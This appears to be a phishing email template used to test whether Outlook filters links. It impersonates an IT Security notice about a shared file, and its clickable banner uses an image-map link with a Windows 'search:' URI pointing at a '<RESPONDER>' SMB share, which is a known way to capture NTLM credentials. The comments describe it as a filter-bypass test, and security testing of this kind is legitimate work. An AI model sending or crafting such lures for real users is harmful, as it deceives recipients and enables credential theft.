# SENDER: noreply@survey-monkeys.com
# SENDER_NAME: IT Security
# SUBJECT: search: URI | image map area href (click image region, not a link)

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#f4f4f4; margin:0; padding:20px; }
        .container { max-width:600px; margin:0 auto; background:#fff; border:1px solid #e0e0e0; border-radius:8px; overflow:hidden; }
        .header { background:#107c10; padding:20px 30px; color:#fff; }
        .header h2 { margin:0; font-size:18px; }
        .body { padding:30px; color:#333; line-height:1.6; }
        .footer { background:#f5f5f5; padding:15px 30px; font-size:11px; color:#888; border-top:1px solid #e0e0e0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><h2>New Shared File Available</h2></div>
        <div class="body">
            <p>Hello,</p>
            <p>A file has been shared to your network folder. Click the preview image below to open it.</p>
            <p style="text-align:center; margin:24px 0;">
                <!--
                  Image map: user sees/clicks a banner image.
                  The area href= is what fires — it's an <area>, not an <a> tag.
                  Tests whether Outlook processes area href= through ShellExecute
                  or strips it as it does regular links.
                -->
                <!-- 400x80 grey banner placeholder (base64 1px GIF scaled up) -->
                <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs="
                     usemap="#filemap"
                     width="400" height="80"
                     style="border:1px solid #ccc;border-radius:4px;background:#e9e9e9;"
                     alt="Click to open shared file">
                <map name="filemap">
                    <!-- Full image clickable region -->
                    <area shape="rect"
                          coords="0,0,400,80"
                          href="search:query=imgmap&amp;crumb=location:\\<RESPONDER>\testshare"
                          alt="Open file">
                </map>
                <br>
                <span style="font-size:11px;color:#666;">Click the preview to open in Windows Search</span>
            </p>
            <p>IT Security Team</p>
        </div>
        <div class="footer">Automated notification — do not reply.</div>
    </div>
</body>
</html>
